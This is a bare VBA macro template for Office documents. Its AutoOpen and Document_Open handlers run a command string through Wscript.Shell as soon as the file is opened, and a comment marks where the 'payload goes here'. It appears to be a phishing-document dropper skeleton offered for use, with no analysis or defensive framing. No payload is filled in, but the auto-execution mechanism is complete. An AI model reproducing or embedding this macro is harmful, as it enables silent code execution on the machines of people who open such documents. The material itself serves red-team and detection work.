Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
' Str = payload goes here

    CreateObject("Wscript.Shell").Run Str
End Sub
